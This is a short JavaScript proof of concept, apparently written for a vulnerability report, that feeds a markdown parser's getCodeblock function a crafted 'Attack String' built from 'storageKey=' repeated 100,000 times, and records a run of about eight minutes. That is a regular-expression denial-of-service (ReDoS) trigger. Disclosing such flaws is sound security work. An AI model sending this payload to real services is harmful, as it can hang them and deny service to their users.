const { getCodeblock } = require("./parseMarkdown.js");

//Attack String :"<codeblock  "+"storageKey='"*100000+"@"
var str = "<codeblock  ";
for (var i = 0; i < 100000; i++) {
  str += "storageKey='";
}
str += "@";

var result = getCodeblock(str);

//real    8m7.094s
